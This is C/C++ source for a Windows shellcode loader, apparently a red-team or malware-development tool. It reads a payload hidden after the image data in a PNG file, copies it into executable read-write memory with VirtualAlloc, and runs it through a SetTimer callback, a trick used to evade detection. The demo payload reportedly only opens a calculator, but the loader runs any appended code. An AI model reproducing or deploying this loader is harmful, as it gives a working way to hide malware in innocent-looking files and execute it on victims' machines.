// Payload-extractor-from-file.cpp
// By WafflesExploits
#define _CRT_SECURE_NO_WARNINGS // Avoid error message from fopen
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

// Constants for file paths and original file size
#define TARGET_FILE_PATH "combined_file.png";         // Path to the modified target file
#define ORIGINAL_FILE_SIZE 6594                    // Replace with the actual size in bytes

// The combined_file.png opens a calculator

/**
 * @brief Retrieves the size of a file.
 *
 * @param filename The path to the file.
 * @param size Pointer to a long int where the file size will be stored.
 * @return BOOL TRUE if successful, FALSE otherwise.
 */
BOOL get_file_size(const char* filename, long int* pSize) {
    FILE* file = fopen(filename, "rb");

    if (file == NULL) {
        printf("Error: Unable to open file '%s'.\n", filename);
        return FALSE;
    }

    // Seek to the end of the file
    if (fseek(file, 0, SEEK_END) != 0) {
        printf("Error: Unable to seek to the end of file '%s'.\n", filename);
        fclose(file);
        return FALSE;
    }

    // Get the current file pointer (size)
    long int file_size = ftell(file);
    if (file_size == -1L) {
        printf("Error: Unable to determine the size of file '%s'.\n", filename);
        fclose(file);
        return FALSE;
    }

    fclose(file);
    *pSize = file_size;
    return TRUE;
}

/**
 * @brief Extracts the hidden payload from the target file and stores it.
 *
 * @param original_size The size of the original file in bytes.
 * @param target_file The path to the target file containing the payload.
 * @param payload Pointer to an unsigned char* where the extracted payload will be stored.
 * @param payload_size Pointer to a size_t where the payload size will be stored.
 * @return BOOL TRUE if extraction is successful, FALSE otherwise.
 */
BOOL extract_payload(long int original_size, const char* target_file, unsigned char** pPayload, size_t* pPayload_size) {
    
    printf("[#] Fetching Image from disk from %s...\n", target_file);
    // Get the size of the target file
    long int target_size;
    if (!get_file_size(target_file, &target_size)) {
        return FALSE;
    }

    // Validate sizes
    if (original_size > target_size) {
        printf("Error: Original file size (%ld bytes) is larger than the target file size (%ld bytes).\n", original_size, target_size);
        return FALSE;
    }

    // Calculate the payload size
    long int payload_size = target_size - original_size;
    if (payload_size == 0) {
        printf("Error: No payload data found after the original file.\n");
        return FALSE;
    }

    printf("[i] Payload size to extract from file: %ld bytes\n", payload_size);

    // Allocate memory for the payload
    unsigned char* Payload = (unsigned char*)malloc(payload_size);
    if (Payload == NULL) {
        printf("Error: Unable to allocate memory for payload.\n");
        return FALSE;
    }

    // Open the target file for reading
    FILE* fp_target = fopen(target_file, "rb");
    if (fp_target == NULL) {
        printf("Error: Unable to open target file '%s' for reading.\n", target_file);
        free(Payload);
        Payload = NULL;
        return FALSE;
    }

    // Moves the file pointer to the position where the payload begins (original_size).
    if (fseek(fp_target, original_size, SEEK_SET) != 0) {
        printf("Error: Unable to seek to position %ld in file '%s'.\n", original_size, target_file);
        fclose(fp_target);
        free(Payload);
        Payload = NULL;
        return FALSE;
    }

    // Reads payload_size bytes from the target file into the allocated buffer.
    size_t bytes_read = fread(Payload, 1, payload_size, fp_target);
    if (bytes_read != payload_size) {
        printf("Error: Unable to read the expected payload size from file '%s'.\n", target_file);
        fclose(fp_target);
        free(Payload);
        Payload = NULL;
        return FALSE;
    }

    fclose(fp_target);
    *pPayload = Payload;
    *pPayload_size = payload_size;
    return TRUE;
}


/**
 * @brief Executes payload via SetTimer Callback function
 *
 * @param Payload Pointer to where payload is stored.
 * @param sPayloadSize Size of Payload.
 * @return BOOL TRUE if extraction is successful, FALSE otherwise.
 */
BOOL ExecutePayloadViaCallback(unsigned char* Payload, size_t sPayloadSize) {
    // -- Allocating memory for payload with VirtualAlloc--
    LPVOID pShellcodeAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);
    printf("[#] Writing Payload ... \n");

    memcpy(pShellcodeAddress, Payload, sPayloadSize);

    // Free the allocated memory for payload
    free(Payload);

    printf("[#] Executing payload ... \n");

    // Executing Payload with SetTimer Callback
    UINT_PTR dummy = 0;
    MSG msg;

    SetTimer(NULL, dummy, NULL, (TIMERPROC)pShellcodeAddress);
    GetMessageW(&msg, NULL, 0, 0);
    DispatchMessageW(&msg);

    // --Free pShellcodeAddress with VirtualFree--
    VirtualFree(pShellcodeAddress, sPayloadSize, MEM_RELEASE);
    
    return TRUE;
}

int main() {
    unsigned char* Payload = NULL;
    size_t sPayloadSize = 0;
    long int OriginalFileSize = ORIGINAL_FILE_SIZE;
    const char TargetFilePath[] = TARGET_FILE_PATH;

    // Extract the payload and store it
    if (!extract_payload(OriginalFileSize, TargetFilePath, &Payload, &sPayloadSize)) {
        printf("[!] Payload extraction failed.\n");
        return EXIT_FAILURE;
    }

    // Execute Payload via Callback Function
    if (!ExecutePayloadViaCallback(Payload, sPayloadSize)) {
        printf("[!] ExecutePayloadViaCallback failed.\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}